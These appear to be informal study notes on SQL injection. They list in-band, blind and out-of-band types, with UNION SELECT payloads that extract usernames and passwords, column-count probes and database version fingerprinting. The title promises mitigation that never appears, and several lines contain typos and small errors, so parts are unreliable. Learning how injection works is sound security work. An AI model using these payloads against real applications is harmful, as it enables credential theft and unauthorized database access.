What is SQL Injection and its types and mitigation :
SQLi in a web based vulnrerebility which allows an attacker to interfrer with query which application makes to its backend database.
By injecting a malicious code into input feilds attacker can steal data, modify records , bypass authentication and even execute system commands.

1) Inband : Reflects error/result 
        a. Error base : & && ' ; || | \n $()    (' OR 1=1--)
        b. Union base : ' UNION SELECT username,password FROM users --
                        'UNION SELECT NULL --              => Error means no 1 column
                        'UNION SELECT NULL,NULL --         => Error means no 1 column
                        'UNION SELECT NULL,NULL.NULL --   => No Error means 3 columns present
                        'order by 1 --
                        'order by 2 --
                        'order by 3 --       => No Error means 3 columns present

2) Blind : Does not reflect but shows signs as delay or requests to our server.
       a. Time based : If condition in true -> sleep 10
                    Makes use of substring function of SQL to determine word by word  to get full string.
       b. Boolean based : True/false : https://apple?id=1 or 1=1   => TRUE
                                     https://apple?id=1 or 1=2   => FALSE
                                     Makes use of substring function of SQL to determine word by word  to get full string.

3) Out of band : Makes use of xp_cmdshell method (Network connection).
                Attacker causes the database to make requests to external DNS/HTTP servers controlled by the attacker.

Examples :
'UNION SELECT NULL,'a' --    <== 2nd colum is char(string)  used to determine column datatype.
'UNION SELECT NULL, username from users --
'UNION SELECT NULL, password from users --
'UNION SELECT NULL, banner from v$version --   for oracle
'UNION SELECT NULL, @@version #                for Mysql & MSSql
